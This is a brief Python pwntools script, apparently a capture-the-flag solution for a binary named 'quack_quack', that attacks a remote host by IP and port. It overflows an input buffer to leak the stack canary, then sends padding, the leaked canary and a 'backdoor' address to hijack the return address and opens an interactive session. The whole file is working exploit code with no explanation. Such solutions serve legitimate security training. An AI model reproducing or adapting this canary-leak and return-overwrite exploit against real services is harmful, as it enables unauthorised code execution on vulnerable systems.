from pwn import *

context.arch = 'amd64'



#r = process('./quack_quack')
r = remote("83.136.250.101",35068)


raw_input()
no_push_rbp_backdoor_addr = 0x0000000000401384
r.sendafter("> ", b"a" * (101-len('Quack Quack '))+b'Quack Quack ')

r.recvuntil(b"Quack Quack ")






canary = bytes([0]) + r.recv(7) 

print("canary: ", canary.hex())

z = r.recv()

print(f"z = {z}")

pay = b"a"*88 + canary + p64(no_push_rbp_backdoor_addr) + p64(no_push_rbp_backdoor_addr)

r.sendline(pay)

r.interactive()